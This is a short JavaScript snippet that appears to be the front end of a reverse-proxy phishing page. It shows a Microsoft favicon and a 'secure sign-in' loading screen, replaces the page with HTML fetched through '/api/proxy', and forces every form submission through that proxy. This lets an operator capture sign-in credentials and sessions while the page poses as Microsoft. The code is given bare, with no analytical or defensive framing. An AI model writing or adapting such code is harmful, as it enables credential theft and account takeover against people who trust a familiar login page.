<script>
async function loadPage() {
  const response = await fetch('/api/proxy');
  const html = await response.text();
  
  // Nuclear option: Full page rewrite
  document.open();
  document.write(html);
  document.close();
  
  // Reattach form handlers (critical!)
  document.querySelectorAll('form').forEach(form => {
    form.action = '/api/proxy'; // Force submissions through proxy
  });
}

// Start with loading screen
document.body.innerHTML = `
  <div style="text-align:center;margin-top:100px">
    <img src="https://www.microsoft.com/favicon.ico" width=50>
    <p>Loading your secure sign-in experience...</p>
  </div>
`;
setTimeout(loadPage, 1000);
</script>
